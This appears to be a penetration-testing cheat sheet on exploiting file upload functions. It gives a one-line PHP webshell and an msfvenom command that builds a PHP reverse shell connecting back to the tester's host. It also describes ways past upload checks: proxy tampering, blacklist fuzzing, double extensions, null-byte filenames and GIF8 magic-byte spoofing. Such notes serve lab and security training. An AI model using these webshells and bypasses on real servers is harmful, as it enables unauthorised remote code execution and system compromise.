
## Resources 


## Webshells 

You can use already existing Webshells such as phpbash
- https://github.com/Arrexel/phpbash

Or you should also be able to always write your own Webshell. In php this would be for example 

```php
<?php system($_REQUEST['cmd']); ?>
```

## Reverse Shell

If there is a upload vulnerability, we can also upload a reverse shell.
- https://pentestmonkey.net/


## Generating Custom Reverse Shell Scripts 
This you can do with msfvenom 

Example 

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

## Client Side Validation 
In case the the upload gets validated on client side, we can just use burpsuite or any other proxy to get the request and then just change it accordingly.


## Blacklisting 

Sometimes the backend is validating the file endings using a blacklist. But this means as long as a specific extension is not in the blacklist, I can still upload it. Use the Burp Intruder or ZAProxy Fuzzing for that. But resending the request do it with Burp, some issues with ZAP for some reasons.


## Whitelisting 

When having whitelistings, usually it gets evaluated if an ending was attached to a file. But sometimes you can use **double extensions** such as somefile.png.php. Which then will get validated as a png file, but can be executed as a php!

Another way to bypass is to use **Character Injection**. For example 

`shell.php%00.jpg`

What was quiet useful here was to create a password list using hashcat the following way 

```bash
hashcat -a 1 --stdout image_extensions.txt phpextensions.txt >> combo.txt 
```

## Type Filters 

Webservers can validate the content in two ways:
- Content-Type Header 
- FileContent

The **Content-Type** you can try to fuzz with for example the `Content-Type Worldist` form Seclists. 
If you know that the content is only regarding images, please grep the seclist and filter out for the `images/*` content-types

The **FileContent** gets validated by the `MIME-TYPE` (Multipurpose Internet Mail Extensions). This is done by invsigating the files first  bytes -> Magic Bytes.  
For this usually the first bytes of the requests content get checked. So if you for example add `GIF8` before your actual phpscript stuff, the MIME-TYPE will result in a gif even though its actually php!


## Limited File Uploads 